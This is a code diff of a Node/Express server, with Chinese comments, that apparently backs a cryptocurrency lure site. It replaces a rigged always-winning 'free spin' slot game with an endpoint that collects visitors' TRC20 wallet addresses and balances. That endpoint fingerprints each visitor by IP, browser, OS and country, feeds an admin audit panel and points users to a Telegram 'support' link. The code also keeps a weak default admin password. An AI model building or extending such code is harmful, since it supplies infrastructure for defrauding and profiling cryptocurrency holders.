@@ -7,6 +7,9 @@ const UAParser = require('ua-parser-js');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// 信任代理（Render/Cloudflare 后面才能拿到真实 IP）
+app.set('trust proxy', true);
+
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -14,37 +17,35 @@ app.use(express.static(path.join(__dirname, 'public')));
 const DATA_DIR = path.join(__dirname, 'data');
 const RECORDS_FILE = path.join(DATA_DIR, 'records.json');
 const CONFIG_FILE = path.join(DATA_DIR, 'config.json');
-const PLAYERS_FILE = path.join(DATA_DIR, 'players.json');
 
-if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
 const DEFAULT_CONFIG = {
     adminPassword: process.env.ADMIN_PASSWORD || 'admin123456',
     dailyLimit: 1,
-    telegramLink: 'https://t.me/your_default_support' // 请改成你的默认飞机链接
+    telegramLink: 'https://t.me/your_default_support' // 改成你的默认飞机链接
 };
 
 const readJson = (filePath, defaultVal = {}) => {
-    try {
-        if (fs.existsSync(filePath)) return JSON.parse(fs.readFileSync(filePath, 'utf8'));
-    } catch (e) { console.error(`读取失败: ${filePath}`, e); }
+    try { if (fs.existsSync(filePath)) return JSON.parse(fs.readFileSync(filePath, 'utf8')); }
+    catch (e) { console.error('读取失败:', filePath, e); }
     return defaultVal;
 };
-
 const writeJson = (filePath, data) => {
-    try { fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8'); } 
-    catch (e) { console.error(`写入失败: ${filePath}`, e); }
+    try { fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8'); }
+    catch (e) { console.error('写入失败:', filePath, e); }
 };
 
 let config = readJson(CONFIG_FILE, DEFAULT_CONFIG);
 let configChanged = false;
-for (let key in DEFAULT_CONFIG) {
+for (const key in DEFAULT_CONFIG) {
     if (config[key] === undefined) { config[key] = DEFAULT_CONFIG[key]; configChanged = true; }
 }
 if (configChanged) writeJson(CONFIG_FILE, config);
 
 let records = readJson(RECORDS_FILE, []);
-let players = readJson(PLAYERS_FILE, {});
+if (!Array.isArray(records)) records = [];
+
 const adminTokens = new Map();
 
 const authenticateToken = (req, res, next) => {
@@ -54,121 +55,159 @@ const authenticateToken = (req, res, next) => {
     next();
 };
 
-// ================= 公共 API =================
+// ========== 工具函数 ==========
+function formatBeijingTime(iso) {
+    try {
+        const d = new Date(iso);
+        if (isNaN(d.getTime())) return '';
+        const bj = new Date(d.getTime() + 8 * 3600 * 1000);
+        return bj.toISOString().replace('T', ' ').slice(0, 19);
+    } catch { return ''; }
+}
+function guessDevice(ua) {
+    const s = (ua || '').toLowerCase();
+    if (/iphone|ipad|ipod/.test(s)) return 'ios';
+    if (/android/.test(s)) return 'android';
+    if (/windows|mac os|macintosh|linux|x11|cros/.test(s)) return 'desktop';
+    return 'unknown';
+}
+function guessCountry(lang) {
+    const map = {
+        zh:'CN', en:'US', es:'ES', hi:'IN', ar:'SA', pt:'BR', ru:'RU', ja:'JP',
+        de:'DE', fr:'FR', ko:'KR', it:'IT', tr:'TR', vi:'VN', th:'TH', id:'ID',
+        ms:'MY', nl:'NL', pl:'PL'
+    };
+    const l = (lang || '').toLowerCase().split('-')[0];
+    return map[l] || '';
+}
+
+// ==================== 公共 API ====================
+
+// 前端读取飞机号配置
 app.get('/api/public-settings', (req, res) => {
     res.json({ telegramLink: config.telegramLink || '' });
 });
 
-app.get('/api/player-state', (req, res) => {
-    const ip = req.ip || req.connection.remoteAddress;
-    const today = new Date().toISOString().split('T')[0];
-    const playerKey = `${ip}_${today}`;
-    if (!players[playerKey]) {
-        players[playerKey] = { spinsLeft: 3, pending: 0, balance: 0, roundClaimed: false };
-        writeJson(PLAYERS_FILE, players);
+// 前端提交 TRC20 记录（原有逻辑：接收前端数据 + 服务器补充 UA/IP/时间等字段）
+app.post('/api/records', (req, res) => {
+    try {
+        const ip = req.ip || req.connection.remoteAddress || '';
+        const ua = req.headers['user-agent'] || '';
+        const parser = new UAParser(ua);
+        const browser = parser.getBrowser();
+        const os = parser.getOS();
+
+        const nowIso = new Date().toISOString();
+        const body = req.body || {};
+        const language = body.language || '';
+        const country = guessCountry(language);
+
+        const newRecord = {
+            id: Date.now() + '_' + Math.random().toString(36).slice(2, 8),
+            address: body.address || '',
+            balance: body.balance || '0.00',
+            amount: body.balance || '0.00',      // 兼容 admin 里的 r.amount 展示
+            language: language,
+            ip: ip,
+            userAgent: ua,
+            device: guessDevice(ua),
+            os: `${os.name || ''} ${os.version || ''}`.trim() || '未知系统',
+            browser: `${browser.name || ''} ${browser.version || ''}`.trim() || '未知浏览器',
+            country: country,
+            visit_time: body.visitTime || nowIso,
+            time: body.timestamp || nowIso,
+            visit_time_local: formatBeijingTime(body.visitTime || nowIso),
+            time_local: formatBeijingTime(body.timestamp || nowIso),
+            auditStatus: 'pending',
+            createdAt: body.timestamp || nowIso
+        };
+
+        records.push(newRecord);
+        writeJson(RECORDS_FILE, records);
+
+        res.json({ success: true, record: newRecord });
+    } catch (e) {
+        console.error('保存记录失败:', e);
+        res.status(500).json({ error: '保存失败' });
     }
-    res.json({ ...players[playerKey], dailyLimit: config.dailyLimit });
 });
 
+// 后台获取所有记录（原有格式：{ records: [...] }）
+app.get('/api/records', authenticateToken, (req, res) => {
+    res.json({ records: records.slice().reverse() });
+});
+
+// 前端查询自己 IP 的提现记录
 app.get('/api/my-withdrawals', (req, res) => {
-    const ip = req.ip || req.connection.remoteAddress;
-    res.json(records.filter(r => r.ip === ip).slice(-10).reverse());
+    const ip = req.ip || req.connection.remoteAddress || '';
+    const mine = records.filter(r => r.ip === ip).slice(-10).reverse();
+    res.json(mine);
 });
 
-app.post('/api/spin', (req, res) => {
-    const ip = req.ip || req.connection.remoteAddress;
-    const today = new Date().toISOString().split('T')[0];
-    const playerKey = `${ip}_${today}`;
-    let player = players[playerKey];
-    if (!player) return res.status(400).json({ error: '玩家不存在' });
-    if (player.spinsLeft <= 0) return res.status(400).json({ error: '今日免费旋转次数已用完' });
+// ==================== 管理员 API ====================
 
-    const SYM_IDS = ['btc', 'eth', 'sol', 'doge', 'usdt', 'trx'];
-    const MATCH_POOL = [2, 3, 4];
-    const PAYOUT_BY_MATCH = { 2: 10, 3: 30, 4: 200, 5: 10000 };
-    const matchCount = MATCH_POOL[Math.floor(Math.random() * MATCH_POOL.length)];
-    const winningSym = SYM_IDS[Math.floor(Math.random() * SYM_IDS.length)];
-    const result = Array(5).fill(null).map(() => SYM_IDS[Math.floor(Math.random() * SYM_IDS.length)]);
-    let placed = 0;
-    while (placed < matchCount) {
-        const pos = Math.floor(Math.random() * 5);
-        if (result[pos] !== winningSym) { result[pos] = winningSym; placed++; }
-    }
-    const actualMatch = result.filter(s => s === winningSym).length;
-    const payout = PAYOUT_BY_MATCH[actualMatch] || 0;
-    player.spinsLeft -= 1;
-    if (payout > 0) player.pending += payout;
-    writeJson(PLAYERS_FILE, players);
-    res.json({ result, matchCount: actualMatch, payout, spinsLeft: player.spinsLeft, pending: player.pending });
-});
-
-app.post('/api/claim', (req, res) => {
-    const ip = req.ip || req.connection.remoteAddress;
-    const today = new Date().toISOString().split('T')[0];
-    const playerKey = `${ip}_${today}`;
-    let player = players[playerKey];
-    if (!player || player.pending <= 0) return res.status(400).json({ error: '没有可领取的奖金' });
-    player.balance += player.pending;
-    player.pending = 0;
-    writeJson(PLAYERS_FILE, players);
-    res.json({ balance: player.balance, success: true });
-});
-
-app.post('/api/withdraw', (req, res) => {
-    const ip = req.ip || req.connection.remoteAddress;
-    const today = new Date().toISOString().split('T')[0];
-    const playerKey = `${ip}_${today}`;
-    const { address, amount } = req.body;
-    if (!address || !address.startsWith('T') || address.length !== 34) return res.status(400).json({ error: 'TRC20 地址格式不正确' });
-    if (!amount || amount <= 0) return res.status(400).json({ error: '提现金额错误' });
-    let player = players[playerKey];
-    if (!player || player.balance < amount) return res.status(400).json({ error: '余额不足' });
-
-    const ua = req.headers['user-agent'] || '';
-    const parser = new UAParser(ua);
-    const browser = parser.getBrowser();
-    const os = parser.getOS();
-    
-    const newRecord = {
-        id: Date.now(), address, amount, status: 'pending',
-        createdAt: new Date().toISOString(), ip: ip,
-        os: `${os.name || '未知'} ${os.version || ''}`.trim(),
-        browser: `${browser.name || '未知'} ${browser.version || ''}`.trim()
-    };
-    records.push(newRecord);
-    player.balance -= amount;
-    writeJson(RECORDS_FILE, records);
-    writeJson(PLAYERS_FILE, players);
-    res.json({ success: true, record: newRecord });
-});
-
-// ================= 管理员 API =================
 app.post('/api/login', (req, res) => {
-    const { password } = req.body;
+    const { password } = req.body || {};
     if (password === config.adminPassword) {
-        const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
+        const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
         adminTokens.set(token, Date.now() + 24 * 60 * 60 * 1000);
         return res.json({ token });
     }
     res.status(401).json({ error: '密码错误' });
 });
 
-app.get('/api/records', authenticateToken, (req, res) => res.json(records.reverse()));
+app.post('/api/audit', authenticateToken, (req, res) => {
+    const { id, status, action } = req.body || {};
+    const finalStatus = status || (action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : null);
+    if (!finalStatus) return res.status(400).json({ error: '无效状态' });
 
-app.get('/api/config', authenticateToken, (req, res) => res.json({ dailyLimit: config.dailyLimit, telegramLink: config.telegramLink }));
+    const rec = records.find(r => String(r.id) === String(id));
+    if (!rec) return res.status(404).json({ error: '记录不存在' });
+    if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') {
+        return res.status(409).json({ error: '该记录已审核' });
+    }
+    rec.auditStatus = finalStatus;
+    rec.auditedAt = new Date().toISOString();
+    writeJson(RECORDS_FILE, records);
+    res.json({ success: true });
+});
+
+app.post('/api/audit-batch', authenticateToken, (req, res) => {
+    const { ids, status, action } = req.body || {};
+    const finalStatus = status || (action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : null);
+    if (!finalStatus || !Array.isArray(ids)) return res.status(400).json({ error: '参数错误' });
+
+    let updated = 0, skipped = 0;
+    ids.forEach(id => {
+        const rec = records.find(r => String(r.id) === String(id));
+        if (!rec) { skipped++; return; }
+        if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') { skipped++; return; }
+        rec.auditStatus = finalStatus;
+        rec.auditedAt = new Date().toISOString();
+        updated++;
+    });
+    writeJson(RECORDS_FILE, records);
+    res.json({ success: true, updated, skipped });
+});
+
+app.get('/api/config', authenticateToken, (req, res) => {
+    res.json({
+        dailyLimit: config.dailyLimit,
+        telegramLink: config.telegramLink || ''
+    });
+});
 
 app.post('/api/config', authenticateToken, (req, res) => {
-    const { dailyLimit } = req.body;
-    if (dailyLimit >= 1 && dailyLimit <= 100) {
-        config.dailyLimit = dailyLimit;
-        writeJson(CONFIG_FILE, config);
-        return res.json({ success: true });
-    }
-    res.status(400).json({ error: '限制范围必须在1-100之间' });
+    const { dailyLimit } = req.body || {};
+    const v = parseInt(dailyLimit, 10);
+    if (isNaN(v) || v < 1 || v > 100) return res.status(400).json({ error: '限制必须在 1-100' });
+    config.dailyLimit = v;
+    writeJson(CONFIG_FILE, config);
+    res.json({ success: true });
 });
 
 app.post('/api/admin/settings', authenticateToken, (req, res) => {
-    const { telegramLink } = req.body;
+    const { telegramLink } = req.body || {};
     if (typeof telegramLink !== 'string') return res.status(400).json({ error: '无效链接' });
     config.telegramLink = telegramLink;
     writeJson(CONFIG_FILE, config);
@@ -176,52 +215,16 @@ app.post('/api/admin/settings', authenticateToken, (req, res) => {
 });
 
 app.post('/api/change-password', authenticateToken, (req, res) => {
-    const { newPassword } = req.body;
-    if (newPassword && newPassword.length >= 6) {
-        config.adminPassword = newPassword;
-        writeJson(CONFIG_FILE, config);
-        return res.json({ success: true });
+    const { oldPassword, newPassword } = req.body || {};
+    if (oldPassword !== undefined && oldPassword !== config.adminPassword) {
+        return res.status(401).json({ error: '当前密码错误' });
     }
-    res.status(400).json({ error: '密码长度至少6位' });
-});
-
-app.post('/api/audit', authenticateToken, (req, res) => {
-    const { id, action } = req.body;
-    const record = records.find(r => r.id === id);
-    if (!record) return res.status(404).json({ error: '记录不存在' });
-    if (record.status !== 'pending') return res.status(400).json({ error: '该记录已审核' });
-    record.status = action === 'approve' ? 'approved' : 'rejected';
-    record.auditedAt = new Date().toISOString();
-    if (action === 'reject') {
-        const ip = record.ip;
-        const today = new Date(record.createdAt).toISOString().split('T')[0];
-        const playerKey = `${ip}_${today}`;
-        if (players[playerKey]) { players[playerKey].balance += record.amount; writeJson(PLAYERS_FILE, players); }
+    if (!newPassword || newPassword.length < 6) {
+        return res.status(400).json({ error: '新密码至少 6 位' });
     }
-    writeJson(RECORDS_FILE, records);
+    config.adminPassword = newPassword;
+    writeJson(CONFIG_FILE, config);
     res.json({ success: true });
 });
 
-app.post('/api/audit-batch', authenticateToken, (req, res) => {
-    const { ids, action } = req.body;
-    let count = 0;
-    ids.forEach(id => {
-        const record = records.find(r => r.id === id);
-        if (record && record.status === 'pending') {
-            record.status = action === 'approve' ? 'approved' : 'rejected';
-            record.auditedAt = new Date().toISOString();
-            if (action === 'reject') {
-                const ip = record.ip;
-                const today = new Date(record.createdAt).toISOString().split('T')[0];
-                const playerKey = `${ip}_${today}`;
-                if (players[playerKey]) players[playerKey].balance += record.amount;
-            }
-            count++;
-        }
-    });
-    writeJson(RECORDS_FILE, records);
-    writeJson(PLAYERS_FILE, players);
-    res.json({ success: true, count });
-});
-
-app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
